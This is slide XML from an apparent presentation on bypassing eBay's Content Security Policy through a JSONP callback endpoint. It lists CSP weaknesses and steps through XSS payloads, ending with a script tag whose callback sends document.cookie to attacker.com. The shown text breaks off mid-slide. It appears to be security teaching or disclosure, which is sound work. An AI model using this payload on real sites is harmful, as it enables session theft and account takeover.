            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>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https://*.ebaystatic.com </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>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https://www.google-analytics.com </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1900"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2EFE8"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>https://www.googletagmanager.com;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1308378" y="5548074"/>
            <a:ext cx="2611636" cy="326469"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2550"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Weaknesses:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1308378" y="6074926"/>
            <a:ext cx="5940028" cy="665917"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16478"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFCF5"/>
          </a:solidFill>
          <a:ln w="22860">
            <a:solidFill>
              <a:srgbClr val="D9D4C9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1285518" y="6074926"/>
            <a:ext cx="91440" cy="665917"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 28562"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="325F7B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1573887" y="6271855"/>
            <a:ext cx="2453045" cy="272058"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">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 unsafe-inline allowed</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7381994" y="6074926"/>
            <a:ext cx="5940028" cy="665917"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16478"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFCF5"/>
          </a:solidFill>
          <a:ln w="22860">
            <a:solidFill>
              <a:srgbClr val="D9D4C9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7359134" y="6074926"/>
            <a:ext cx="91440" cy="665917"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 28562"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="325F7B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7647503" y="6271855"/>
            <a:ext cx="2329815" cy="272058"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">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 unsafe-eval allowed</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1308378" y="6874431"/>
            <a:ext cx="5940028" cy="665917"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16478"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFCF5"/>
          </a:solidFill>
          <a:ln w="22860">
            <a:solidFill>
              <a:srgbClr val="D9D4C9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1285518" y="6874431"/>
            <a:ext cx="91440" cy="665917"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 28562"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="325F7B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1573887" y="7071360"/>
            <a:ext cx="2473523" cy="272058"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">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 Wildcard subdomains</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7381994" y="6874431"/>
            <a:ext cx="5940028" cy="665917"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16478"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFCF5"/>
          </a:solidFill>
          <a:ln w="22860">
            <a:solidFill>
              <a:srgbClr val="D9D4C9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7359134" y="6874431"/>
            <a:ext cx="91440" cy="665917"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 28562"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="325F7B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7647503" y="7071360"/>
            <a:ext cx="3258145" cy="272058"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">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 Multiple third-party domains</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99498" y="929759"/>
            <a:ext cx="4827627" cy="508635"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack Vector Discovered</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1699498" y="1485067"/>
            <a:ext cx="4960620" cy="406837"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Step 1: Finding JSONP Endpoint</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1699498" y="2067044"/>
            <a:ext cx="11231285" cy="223599"/>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latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Researcher discovered JSONP endpoint:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1699498" y="2421969"/>
            <a:ext cx="11231285" cy="467678"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5221"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691402" y="2421969"/>
            <a:ext cx="11247477" cy="467678"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5221"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1854160" y="2544008"/>
            <a:ext cx="10921960" cy="223599"/>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https://vi.vipr.ebaystatic.com/v1/picture/callback=test</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1699498" y="3064788"/>
            <a:ext cx="2441496" cy="305157"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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Response:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1699498" y="3545086"/>
            <a:ext cx="11231285" cy="467678"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5221"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691402" y="3545086"/>
            <a:ext cx="11247477" cy="467678"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5221"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1854160" y="3667125"/>
            <a:ext cx="10921960" cy="223599"/>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test({"image":"https://..."})</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1699498" y="4225383"/>
            <a:ext cx="11231285" cy="27861"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2B4150">
              <a:alpha val="50000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1699498" y="4428292"/>
            <a:ext cx="3569613" cy="406837"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Step 2: Crafting Exploit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1699498" y="5010269"/>
            <a:ext cx="11231285" cy="467678"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5221"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691402" y="5010269"/>
            <a:ext cx="11247477" cy="467678"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5221"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1854160" y="5132308"/>
            <a:ext cx="10921960" cy="223599"/>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&lt;script src="https://vi.vipr.ebaystatic.com/v1/picture?callback=alert(document.cookie)"&gt;&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1699498" y="5653088"/>
            <a:ext cx="2441496" cy="305157"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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Result:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1699498" y="6133386"/>
            <a:ext cx="11231285" cy="467678"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5221"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691402" y="6133386"/>
            <a:ext cx="11247477" cy="467678"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5221"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1854160" y="6255425"/>
            <a:ext cx="10921960" cy="223599"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2EFE8"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>alert(document.cookie)({"image":"https://..."})</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1699498" y="6732389"/>
            <a:ext cx="11231285" cy="567333"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4304"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C9DDE9"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="22" name="Image 0" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1862257" y="6953250"/>
            <a:ext cx="203359" cy="162758"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2228374" y="6889790"/>
            <a:ext cx="10539651" cy="223599"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Syntax Error!</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> - Doesn't execute properly.</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80743"/>
            <a:ext cx="6322933"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Step 3: Refining Exploit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="2229683"/>
            <a:ext cx="7556421" cy="1428750"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2381"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="782479" y="2229683"/>
            <a:ext cx="7579043" cy="1428750"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2381"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1009293" y="2399705"/>
            <a:ext cx="7125414"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&lt;script src="https://vi.vipr.ebaystatic.com/v1/picture?callback=fetch('https://attacker.com/steal?cookie='+document.cookie)//"&gt;&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="3998595"/>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Result:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="4764048"/>
            <a:ext cx="7556421" cy="1065848"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3192"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
